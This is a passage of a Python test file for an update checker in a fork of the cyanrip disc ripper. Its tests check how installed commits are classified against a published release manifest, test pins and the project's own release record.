    # The floor for this test: the commit really is unknown to our own record, so the
    # answer below cannot have come from there.
    assert fork_source.release_seq_for_commit("abc1234") is None

    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="abc1234")

    assert offer.verdict == OFFER_UP_TO_DATE, (
        "a user on the fork's newest published release is up to date for their "
        f"channel; got {offer.verdict!r} — {offer.detail!r}"
    )
    assert "release 17" in offer.detail
    assert "newest published" in offer.detail
    # And the half that explains the `unapproved` they will see on every rip.
    assert "unapproved" in offer.detail
    assert offer.install_commit == fork_source.FORK_PIN
    assert offer.auto_installable is True


def test_without_the_manifest_source_that_build_is_a_mismatch() -> None:
    """The non-triviality check: the test above passes *because* of the new source.

    Same commit, same channel, **no manifest** — the only difference is whether the
    fork's document is in hand. If this returned `up_to_date` too, the test above
    would be proving nothing about where the sequence came from.
    """
    offer = evaluate_offer(None, CHANNEL_STABLE, installed_commit="abc1234")
    assert offer.verdict == OFFER_MISMATCHED
    assert "release 17" not in offer.detail
    # Still useful offline, which is the reason the classification runs before the
    # network at all: it names the build to install without needing to look anything
    # up.
    assert offer.install_commit == fork_source.FORK_PIN
    assert offer.auto_installable is True


def test_our_own_record_still_answers_with_no_manifest_at_all() -> None:
    """The first source has not been replaced by the second.

    `ddf7ac3` is release 11 in our record and in no current manifest. Offline, on the
    approved pin, the answer must be the reassuring one — and it must not depend on a
    document that no longer mentions the build.
    """
    offer = evaluate_offer(None, CHANNEL_STABLE, installed_commit=fork_source.FORK_PIN)
    assert offer.verdict == OFFER_NOT_DETERMINED
    assert "unreachable or unreadable" in offer.detail
    # NOT a mismatch: the build is ours, we simply could not check for a newer one.
    assert offer.verdict != OFFER_MISMATCHED
    assert offer.install_commit == ""


def test_a_session_test_pin_is_still_a_test_pin_even_if_the_manifest_names_it() -> None:
    """Order matters: the nominated session build outranks its sequence.

    A round's test pin can legitimately also be a published release. Telling an
    operator mid-session that their ripper is merely "up to date" would drop the fact
    that matters — that this build is what both projects agreed to gather evidence
    with — and `auto_installable` must stay False so nothing installs over it.
    """
    pinned_as_release = _future_release(fork_source.FORK_TEST_PIN, 99)
    manifest = parse_manifest(json.dumps(pinned_as_release))
    assert manifest is not None
    offer = evaluate_offer(
        manifest, CHANNEL_STABLE, installed_commit=fork_source.FORK_TEST_PIN
    )
    assert offer.verdict == OFFER_NOT_DETERMINED
    assert "test pin" in offer.detail
    assert offer.auto_installable is False


def test_a_build_ahead_of_the_channel_does_not_borrow_the_heads_version() -> None:
    """Beta build, stable channel: nothing newer on stable, and a different build.

    This is the state the new source makes reachable, and it is the one that could
    print a true-in-every-field, false-as-a-sentence answer: the head's *version*
    number rendered against the *installed* commit, described as being on the channel
    it is not on. `_up_to_date_offer` must say what is actually the case — nothing
    newer is published on this channel, and here is where each build sits.
    """
    document = json.loads(json.dumps(PUBLISHED_V2))
    # Stable stays at release 16 / `c4d1a00`; beta moves ahead to 17 / `abc1234`.
    document["channels"]["beta"]["commit"] = "abc1234"
    document["channels"]["beta"]["release_seq"] = 17
    document["channels"]["beta"]["version"] = "0.9.4-rc1+platterpus.7"
    document["channels"]["beta"]["install"] = (
        "https://github.com/rmccann-hub/cyanrip/archive/abc1234.tar.gz"
    )
    manifest = parse_manifest(json.dumps(document))
    assert manifest is not None
    stable_row = manifest.channel(CHANNEL_STABLE)
    assert stable_row is not None

    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="abc1234")

    assert offer.verdict == OFFER_UP_TO_DATE
    # It must NOT claim the installed build is the newest published on stable.
    assert "newest published" not in offer.detail
    # Both positions stated, so the sentence is checkable by the person reading it.
    assert "release 17" in offer.detail
    assert f"release {stable_row.release_seq}" in offer.detail
    assert "abc1234" in offer.detail
    # And the head's version string is NOT paired with somebody else's commit.
    assert f"{stable_row.version} (abc1234)" not in offer.detail


def test_the_manifest_source_never_invents_a_sequence() -> None:
    """A commit no channel names gets no sequence from the manifest.

    The tri-state has to survive the new source: a second place to look is only an
    improvement if it still answers "I don't know" when it does not know. Asserted on
    the resolver directly as well as on the verdict, because the verdict could be
    right for another reason and this is the property that matters.
    """
    manifest = parse_manifest(json.dumps(PUBLISHED_V2))
    assert manifest is not None
    # The rows really are populated, so a `None` below is a refusal rather than an
    # empty document — the "can this check be satisfied by finding nothing?" floor.
    assert _seq_from_manifest("c4d1a00", manifest) == 16
    assert _seq_from_manifest("deadbee", manifest) is None
    assert _seq_from_manifest("deadbee", None) is None

    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="deadbee")
    assert offer.verdict == OFFER_MISMATCHED
    assert offer.release is None
